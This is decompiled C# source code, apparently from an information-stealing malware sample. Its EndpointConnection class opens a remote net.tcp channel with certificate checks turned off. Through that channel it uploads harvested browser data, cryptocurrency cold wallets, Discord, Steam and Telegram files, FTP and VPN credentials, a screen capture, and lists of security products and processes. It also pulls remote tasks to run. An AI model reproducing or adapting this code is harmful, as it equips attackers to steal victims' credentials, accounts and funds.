using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Security;

// Token: 0x0200000C RID: 12
public class EndpointConnection : IDisposable
{
	// Token: 0x0600003B RID: 59 RVA: 0x00005EC8 File Offset: 0x000040C8
	public bool RequestConnection(string address)
	{
		bool result;
		try
		{
			this.serviceInterface = new ChannelFactory<IRemoteEndpoint>(SystemInfoHelper.CreateBind(), new EndpointAddress(new Uri("net.tcp://" + address + "/"), EndpointIdentity.CreateDnsIdentity("localhost"), new AddressHeader[0]))
			{
				Credentials = 
				{
					ServiceCertificate = 
					{
						Authentication = 
						{
							CertificateValidationMode = X509CertificateValidationMode.None
						}
					}
				}
			}.CreateChannel();
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00005F48 File Offset: 0x00004148
	public bool TryGetConnection()
	{
		bool result;
		try
		{
			result = this.serviceInterface.CheckConnect();
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00005F7C File Offset: 0x0000417C
	public bool TryVerify(ScanResult result)
	{
		bool result2;
		try
		{
			this.serviceInterface.VerifyScanRequest(result);
			result2 = true;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x00005FB0 File Offset: 0x000041B0
	public bool TryGetArgs(out ScanningArgs args)
	{
		bool result;
		try
		{
			args = new ScanningArgs();
			args = this.serviceInterface.GetArguments();
			result = true;
		}
		catch (Exception)
		{
			args = new ScanningArgs();
			result = false;
		}
		return result;
	}

	// Token: 0x0600003F RID: 63 RVA: 0x00005FF4 File Offset: 0x000041F4
	public ApiResponse TryInit(ScanResult result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.Init(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x00006028 File Offset: 0x00004228
	public ApiResponse TryInitDisplay(byte[] result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.InitDisplay(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000041 RID: 65 RVA: 0x0000605C File Offset: 0x0000425C
	public ApiResponse TryInitBrowsers(List<Browser> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartBrowsers(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000042 RID: 66 RVA: 0x00006090 File Offset: 0x00004290
	public ApiResponse TryInitColdWallets(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartColdWallets(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000043 RID: 67 RVA: 0x000060C4 File Offset: 0x000042C4
	public ApiResponse TryInitDefenders(List<string> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartDefenders(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000044 RID: 68 RVA: 0x000060F8 File Offset: 0x000042F8
	public ApiResponse TryInitDiscord(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartDiscord(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000045 RID: 69 RVA: 0x0000612C File Offset: 0x0000432C
	public ApiResponse TryInitFtpConnections(List<Account> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartFtpConnections(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000046 RID: 70 RVA: 0x00006160 File Offset: 0x00004360
	public ApiResponse TryInitHardwares(List<SystemHardware> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartHardwares(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000047 RID: 71 RVA: 0x00006194 File Offset: 0x00004394
	public ApiResponse TryInitInstalledBrowsers(List<BrowserVersion> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartInstalledBrowsers(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000048 RID: 72 RVA: 0x000061C8 File Offset: 0x000043C8
	public ApiResponse TryInitInstalledSoftwares(List<string> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartInstalledSoftwares(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000049 RID: 73 RVA: 0x000061FC File Offset: 0x000043FC
	public ApiResponse TryInitLanguages(List<string> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartLanguages(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004A RID: 74 RVA: 0x00006230 File Offset: 0x00004430
	public ApiResponse TryInitNordVPN(List<Account> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartNordVPN(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004B RID: 75 RVA: 0x00006264 File Offset: 0x00004464
	public ApiResponse TryInitOpenVPN(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartOpenVPN(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004C RID: 76 RVA: 0x00006298 File Offset: 0x00004498
	public ApiResponse TryInitProcesses(List<string> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartProcesses(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004D RID: 77 RVA: 0x000062CC File Offset: 0x000044CC
	public ApiResponse TryInitProtonVPN(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartProtonVPN(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00006300 File Offset: 0x00004500
	public ApiResponse TryInitScannedFiles(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartScannedFiles(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x0600004F RID: 79 RVA: 0x00006334 File Offset: 0x00004534
	public ApiResponse TryInitSteamFiles(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartSteamFiles(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00006368 File Offset: 0x00004568
	public ApiResponse TryInitTelegramFiles(List<ScannedFile> result)
	{
		ApiResponse result2;
		try
		{
			result2 = this.serviceInterface.PartTelegramFiles(result);
		}
		catch (Exception)
		{
			result2 = ApiResponse.Unknown;
		}
		return result2;
	}

	// Token: 0x06000051 RID: 81 RVA: 0x0000639C File Offset: 0x0000459C
	public bool TryConfirm()
	{
		bool result;
		try
		{
			this.serviceInterface.Confirm();
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000052 RID: 82 RVA: 0x000063D0 File Offset: 0x000045D0
	public bool TryGetTasks(ScanResult user, out IList<UpdateTask> remoteTasks)
	{
		bool result;
		try
		{
			remoteTasks = this.serviceInterface.GetUpdates(user);
			result = true;
		}
		catch (Exception)
		{
			remoteTasks = new List<UpdateTask>();
			result = false;
		}
		return result;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x0000640C File Offset: 0x0000460C
	public bool TryCompleteTask(ScanResult user, int taskId)
	{
		bool result;
		try
		{
			this.serviceInterface.VerifyUpdate(user, taskId);
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000054 RID: 84 RVA: 0x00003322 File Offset: 0x00001522
	public void Dispose()
	{
		this.Dispose(true);
		GC.SuppressFinalize(this);
	}

	// Token: 0x06000055 RID: 85 RVA: 0x00003331 File Offset: 0x00001531
	protected virtual void Dispose(bool managed)
	{
		if (managed && this.serviceInterface != null)
		{
			IClientChannel clientChannel = this.serviceInterface as IClientChannel;
			if (clientChannel != null)
			{
				clientChannel.Close();
			}
			IClientChannel clientChannel2 = this.serviceInterface as IClientChannel;
			if (clientChannel2 == null)
			{
				return;
			}
			clientChannel2.Abort();
		}
	}

	// Token: 0x0400000A RID: 10
	public IRemoteEndpoint serviceInterface;
}
